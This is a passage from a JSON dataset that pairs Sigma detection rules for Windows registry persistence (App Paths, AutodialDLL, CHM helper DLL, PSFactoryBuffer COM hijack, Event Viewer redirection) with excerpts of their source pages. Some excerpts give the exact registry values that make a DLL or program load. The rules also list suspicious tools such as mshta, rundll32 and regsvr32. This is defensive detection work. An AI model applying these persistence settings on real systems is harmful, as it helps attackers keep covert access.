    "markdown": "# Beyond good ol’ Run key, Part 3 Posted on 2013-01-19 Possible Autostart/start mechanisms that are built-in ‘natively’ in Windows and also available by means of extra features offered by many applications go beyond typical path locations and registry keys highlighted by popular programs and scripts like Autoruns and SilentRunners. I have covered some of the non-standard persistence techniques in 2 older posts in the series here and here, but as usual – there is always more to write about. In this post I will cover another batch of less known and possibly ‘obscure’ technique that could be potentially used",
    "sigma_rule": {
      "title": "Potential Persistence Via App Paths Default Property",
      "id": "707e097c-e20f-4f67-8807-1f72ff4500d6",
      "status": "test",
      "description": "Detects changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry. Which might be used as a method of persistence\nThe entries found under App Paths are used primarily for the following purposes.\nFirst, to map an application's executable file name to that file's fully qualified path.\nSecond, to prepend information to the PATH environment variable on a per-application, per-process basis.\n",
      "references": [
        "https://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://learn.microsoft.com/en-us/windows/win32/shell/app-registration"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-10",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.012"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths",
          "TargetObject|endswith": [
            "(Default)",
            "Path"
          ],
          "Details|contains": [
            "\\Users\\Public",
            "\\AppData\\Local\\Temp\\",
            "\\Windows\\Temp\\",
            "\\Desktop\\",
            "\\Downloads\\",
            "%temp%",
            "%tmp%",
            "iex",
            "Invoke-",
            "rundll32",
            "regsvr32",
            "mshta",
            "cscript",
            "wscript",
            ".bat",
            ".hta",
            ".dll",
            ".ps1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate applications registering their binary from on of the suspicious locations mentioned above (tune it)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_app_paths.yml"
  },
  "988": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/shell/app-registration",
    "markdown": "# Application Registration This topic discusses how applications can expose information about themselves necessary to enable certain scenarios. This includes information needed to locate the application, the verbs that the application supports and the types of files that an application can handle. This topic is organized as follows: - Finding an Application Executable - Registering Applications - Using the App Paths Subkey - Using the Applications Subkey - Registering Verbs and Other File Association Information - Registering a Perceived Type - Related topics > **Note** > Applications can also be registered in the Set Program Access and Computer Defaults (SPAD)",
    "sigma_rule": {
      "title": "Potential Persistence Via App Paths Default Property",
      "id": "707e097c-e20f-4f67-8807-1f72ff4500d6",
      "status": "test",
      "description": "Detects changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry. Which might be used as a method of persistence\nThe entries found under App Paths are used primarily for the following purposes.\nFirst, to map an application's executable file name to that file's fully qualified path.\nSecond, to prepend information to the PATH environment variable on a per-application, per-process basis.\n",
      "references": [
        "https://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://learn.microsoft.com/en-us/windows/win32/shell/app-registration"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-10",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.012"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths",
          "TargetObject|endswith": [
            "(Default)",
            "Path"
          ],
          "Details|contains": [
            "\\Users\\Public",
            "\\AppData\\Local\\Temp\\",
            "\\Windows\\Temp\\",
            "\\Desktop\\",
            "\\Downloads\\",
            "%temp%",
            "%tmp%",
            "iex",
            "Invoke-",
            "rundll32",
            "regsvr32",
            "mshta",
            "cscript",
            "wscript",
            ".bat",
            ".hta",
            ".dll",
            ".ps1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate applications registering their binary from on of the suspicious locations mentioned above (tune it)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_app_paths.yml"
  },
  "989": {
    "url": "https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/",
    "markdown": "# Beyond good ol’ Run key, Part 24 **Posted on** 2015-01-13 Ability to load a DLL of your choice anytime someone is connecting to the internet is something that definitely deserves some attention. This is why I will describe here yet another obscure mechanism that can be abused for malicious purposes. Courtesy of Winsock 2 library (ws2_32.dll). When Winsock library connects to the internet it ‘talks’ to various service providers and probes them for connectivity services. It’s actually pretty complex and I won’t pretend that I fully understand what’s going on there yet there is one thing which this library",
    "sigma_rule": {
      "title": "Potential Persistence Via AutodialDLL",
      "id": "e6fe26ee-d063-4f5b-b007-39e90aaf50e3",
      "status": "test",
      "description": "Detects change the the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library",
      "references": [
        "https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/",
        "https://persistence-info.github.io/Data/autodialdll.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-10",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\WinSock2\\Parameters\\AutodialDLL"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_autodial_dll.yml"
  },
  "990": {
    "url": "https://persistence-info.github.io/Data/autodialdll.html",
    "markdown": "# persistence-info.github.io ## Autodial DLL ### Location: ``` HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\AutodialDLL ``` ### Classification: | Criteria | Value | |------------------|----------------------| | Permissions | Admin | | Security context | System [^1] | | Persistence type | Registry | | Code type | DLL | | Launch type | Automatic [^2] | | Impact | Non-destructive [^3] | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > When Winsock library connects to the internet it ‘talks’ to various service providers and probes them for connectivity services. […] At some stage",
    "sigma_rule": {
      "title": "Potential Persistence Via AutodialDLL",
      "id": "e6fe26ee-d063-4f5b-b007-39e90aaf50e3",
      "status": "test",
      "description": "Detects change the the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library",
      "references": [
        "https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/",
        "https://persistence-info.github.io/Data/autodialdll.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-10",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\WinSock2\\Parameters\\AutodialDLL"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_autodial_dll.yml"
  },
  "991": {
    "url": "https://persistence-info.github.io/Data/htmlhelpauthor.html",
    "markdown": "# persistence-info.github.io ## .chm helper DLL ### Location: ``` HKCU\\Software\\Microsoft\\HtmlHelp Author ``` ### Classification: | Criteria | Value | |-------------------|---------------------| | Permissions | User | | Security context | User | | Persistence type | Registry | | Code type | DLL | | Launch type | User initiated [^1] | | Impact | Non-destructive | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > The DLL of your choice will be loaded anytime the old-school .chm file is opened. ### References: https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/ ### See also: hhctrl.ocx",
    "sigma_rule": {
      "title": "Potential Persistence Via CHM Helper DLL",
      "id": "976dd1f2-a484-45ec-aa1d-0e87e882262b",
      "status": "test",
      "description": "Detects when an attacker modifies the registry key \"HtmlHelp Author\" to achieve persistence",
      "references": [
        "https://persistence-info.github.io/Data/htmlhelpauthor.html",
        "https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Software\\Microsoft\\HtmlHelp Author\\Location",
            "\\Software\\WOW6432Node\\Microsoft\\HtmlHelp Author\\Location"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_chm.yml"
  },
  "992": {
    "url": "https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/",
    "markdown": "# Beyond good ol’ Run key, Part 76 Posted on 2018-04-22 Here’s yet another trick you can use to achieve persistence; this time the DLL of your choice will be loaded anytime the old-school .chm file is opened. While the documentation in this format slowly disappears from new programs you can still find plenty of software that uses it. In order to achieve the persistence this way one has to add the following Registry key: ``` [HKEY_CURRENT_USER\\Software\\Microsoft\\HtmlHelp Author] \"location\"=\"c:\\\\test\\\\test.dll\" ```",
    "sigma_rule": {
      "title": "Potential Persistence Via CHM Helper DLL",
      "id": "976dd1f2-a484-45ec-aa1d-0e87e882262b",
      "status": "test",
      "description": "Detects when an attacker modifies the registry key \"HtmlHelp Author\" to achieve persistence",
      "references": [
        "https://persistence-info.github.io/Data/htmlhelpauthor.html",
        "https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Software\\Microsoft\\HtmlHelp Author\\Location",
            "\\Software\\WOW6432Node\\Microsoft\\HtmlHelp Author\\Location"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_chm.yml"
  },
  "993": {
    "url": "https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine",
    "markdown": "# RomCom Resurfaces: Targeting Politicians in Ukraine and U.S.-Based Healthcare Providing Aid to Refugees from Ukraine **Category:** CYBERSECURITY **Date:** 06.07.23 ## Summary The RomCom threat actor has been carefully following geopolitical events surrounding the war in Ukraine, targeting militaries, food supply chains, and IT companies. In RomCom’s latest campaign, the BlackBerry Threat Research and Intelligence team observed RomCom targeting politicians in Ukraine who are working closely with Western countries, and a U.S.-based healthcare company providing humanitarian aid to the refugees fleeing from Ukraine and receiving medical assistance in the U.S. This report is the first part of our research covering",
    "sigma_rule": {
      "title": "Potential PSFactoryBuffer COM Hijacking",
      "id": "243380fa-11eb-4141-af92-e14925e77c1b",
      "status": "test",
      "description": "Detects changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "references": [
        "https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine",
        "https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html",
        "https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection",
        "https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html"
      ],
      "author": "BlackBerry Threat Research and Intelligence Team - @Joseliyo_Jstnk",
      "date": "2023-06-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.015"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)"
        },
        "filter_main": {
          "Details": [
            "%windir%\\System32\\ActXPrxy.dll",
            "C:\\Windows\\System32\\ActXPrxy.dll"
          ]
        },
        "condition": "selection and not filter_main"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_comhijack_psfactorybuffer.yml"
  },
  "994": {
    "url": "https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html",
    "markdown": "# Home / Xcyclopedia / Library / CLSID C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6 | PSFactoryBuffer ## {C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6} ### PSFactoryBuffer ## Registry ### InProcServer32 ``` C:\\Windows\\System32\\ActXPrxy.dll ``` >> ThreadingModel: `Both`",
    "sigma_rule": {
      "title": "Potential PSFactoryBuffer COM Hijacking",
      "id": "243380fa-11eb-4141-af92-e14925e77c1b",
      "status": "test",
      "description": "Detects changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "references": [
        "https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine",
        "https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html",
        "https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection",
        "https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html"
      ],
      "author": "BlackBerry Threat Research and Intelligence Team - @Joseliyo_Jstnk",
      "date": "2023-06-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.015"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)"
        },
        "filter_main": {
          "Details": [
            "%windir%\\System32\\ActXPrxy.dll",
            "C:\\Windows\\System32\\ActXPrxy.dll"
          ]
        },
        "condition": "selection and not filter_main"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_comhijack_psfactorybuffer.yml"
  },
  "995": {
    "url": "https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential PSFactoryBuffer COM Hijacking",
      "id": "243380fa-11eb-4141-af92-e14925e77c1b",
      "status": "test",
      "description": "Detects changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "references": [
        "https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine",
        "https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html",
        "https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection",
        "https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html"
      ],
      "author": "BlackBerry Threat Research and Intelligence Team - @Joseliyo_Jstnk",
      "date": "2023-06-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.015"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)"
        },
        "filter_main": {
          "Details": [
            "%windir%\\System32\\ActXPrxy.dll",
            "C:\\Windows\\System32\\ActXPrxy.dll"
          ]
        },
        "condition": "selection and not filter_main"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_comhijack_psfactorybuffer.yml"
  },
  "996": {
    "url": "https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html",
    "markdown": "# Void Rabisu’s Use of RomCom Backdoor Shows a Growing Shift in Threat Actors’ Goals **Cyber Threats** **Date:** May 30, 2023 --- *With contributions from Veronica Chierzi and Jayvee Mark Villaroman* Since the start of the war in Ukraine in February 2022, the number of cyber campaigns against Ukraine and North Atlantic Treaty Organization (NATO) countries has increased significantly. These campaigns come from many different angles: known advanced persistent threat (APT) actors, APT actors that were not publicly reported on before, and cyber mercenaries, hacktivists, and criminal actors who appear to have shifted from purely financial motives to geopolitical goals.",
    "sigma_rule": {
      "title": "Potential PSFactoryBuffer COM Hijacking",
      "id": "243380fa-11eb-4141-af92-e14925e77c1b",
      "status": "test",
      "description": "Detects changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "references": [
        "https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine",
        "https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html",
        "https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection",
        "https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html"
      ],
      "author": "BlackBerry Threat Research and Intelligence Team - @Joseliyo_Jstnk",
      "date": "2023-06-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1546.015"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)"
        },
        "filter_main": {
          "Details": [
            "%windir%\\System32\\ActXPrxy.dll",
            "C:\\Windows\\System32\\ActXPrxy.dll"
          ]
        },
        "condition": "selection and not filter_main"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_comhijack_psfactorybuffer.yml"
  },
  "997": {
    "url": "https://twitter.com/nas_bench/status/1626648985824788480",
    "markdown": "# Post Feb 17, 2023 Persistence via Event Viewer help link😅using \"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\\" Add \"MicrosoftRedirectionProgram\" with your program and add \"ConfirmUrl\" to 1 to avoid prompt ```image Description: The image displays a screenshot of the Windows Registry Editor, specifically showing the key path 'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\'. It lists several registry values related to a 'MicrosoftRedirectionProgram'. The table includes the 'Name', 'Type', and 'Data' columns, detailing entries such as 'MicrosoftRedirectionProgram', 'MicrosoftRedirectionProgramCommandLineParameters', and 'MicrosoftRedirectionURL', with associated data values like the path to 'calc.exe' and a URL. Transcription: | HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer Name Type Data ----------------------------------------------------------------------------------------------------------- (Default) REG_SZ (value not set) MicrosoftRedirectionProgram",
    "sigma_rule": {
      "title": "Potential Persistence Via Event Viewer Events.asp",
      "id": "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
      "status": "test",
      "description": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique",
      "references": [
        "https://twitter.com/nas_bench/status/1626648985824788480",
        "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
        "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
        "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-17",
      "modified": "2023-03-05",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionURL"
          ]
        },
        "filter_default_redirect_program": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
          "Details": "%%SystemRoot%%\\PCHealth\\HelpCtr\\Binaries\\HelpCtr.exe"
        },
        "filter_default_redirect_program_cli": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgramCommandLineParameters",
          "Details": "-url hcp://services/centers/support?topic=%%s"
        },
        "filter_url": {
          "Details": "http://go.microsoft.com/fwlink/events.asp"
        },
        "filter_cleaner": {
          "Details": "(Empty)"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_event_viewer_events_asp.yml"
  },
  "998": {
    "url": "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
    "markdown": "# Turn off Event Viewer \"Events.asp\" links Specifies whether \"Events.asp\" hyperlinks are available for events within the Event Viewer application. The Event Viewer normally makes all HTTP(S) URLs into hot links that activate the Internet browser when clicked. In addition, \"More Information\" is placed at the end of the description text if the event is created by a Microsoft component. This text contains a link (URL) that, if clicked, sends information about the event to Microsoft, and allows users to learn more about why that event occurred. If you enable this setting, event description URL links are not activated and",
    "sigma_rule": {
      "title": "Potential Persistence Via Event Viewer Events.asp",
      "id": "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
      "status": "test",
      "description": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique",
      "references": [
        "https://twitter.com/nas_bench/status/1626648985824788480",
        "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
        "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
        "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-17",
      "modified": "2023-03-05",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionURL"
          ]
        },
        "filter_default_redirect_program": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
          "Details": "%%SystemRoot%%\\PCHealth\\HelpCtr\\Binaries\\HelpCtr.exe"
        },
        "filter_default_redirect_program_cli": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgramCommandLineParameters",
          "Details": "-url hcp://services/centers/support?topic=%%s"
        },
        "filter_url": {
          "Details": "http://go.microsoft.com/fwlink/events.asp"
        },
        "filter_cleaner": {
          "Details": "(Empty)"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_event_viewer_events_asp.yml"
  },
  "999": {
    "url": "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
    "markdown": "# Beyond good ol’ Run key, Part 103 Posted on 2019-02-15 This is yet another feature of Windows. This time it is a configuration settings for Event Viewer. When you open the program via *eventvr.exe/msc* it will launch the *mmc.exe* which in turn will load an Event Viewer snap-in. The Event Viewer allows to view the system / application logs that we all should be familiar with. As part of a user experience the Event Viewer offers a clickable *Event Log Online Help* link: ```image Alt: Event Viewer Description: The image displays a screenshot of an Event Viewer log entry",
    "sigma_rule": {
      "title": "Potential Persistence Via Event Viewer Events.asp",
      "id": "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
      "status": "test",
      "description": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique",
      "references": [
        "https://twitter.com/nas_bench/status/1626648985824788480",
        "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
        "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
        "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-17",
      "modified": "2023-03-05",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionURL"
          ]
        },
        "filter_default_redirect_program": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
          "Details": "%%SystemRoot%%\\PCHealth\\HelpCtr\\Binaries\\HelpCtr.exe"
        },
        "filter_default_redirect_program_cli": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgramCommandLineParameters",
          "Details": "-url hcp://services/centers/support?topic=%%s"
        },
        "filter_url": {
          "Details": "http://go.microsoft.com/fwlink/events.asp"
        },
        "filter_cleaner": {
          "Details": "(Empty)"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_event_viewer_events_asp.yml"
  },
  "1000": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via Event Viewer Events.asp",
      "id": "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
      "status": "test",
      "description": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique",
      "references": [
        "https://twitter.com/nas_bench/status/1626648985824788480",
        "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
        "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
        "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-17",
      "modified": "2023-03-05",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionURL"
          ]
        },
        "filter_default_redirect_program": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
          "Details": "%%SystemRoot%%\\PCHealth\\HelpCtr\\Binaries\\HelpCtr.exe"
        },
        "filter_default_redirect_program_cli": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgramCommandLineParameters",
          "Details": "-url hcp://services/centers/support?topic=%%s"
        },
        "filter_url": {
          "Details": "http://go.microsoft.com/fwlink/events.asp"
        },
        "filter_cleaner": {
          "Details": "(Empty)"
        },
        "condition": "selection and not 1 of filter_*"
      },
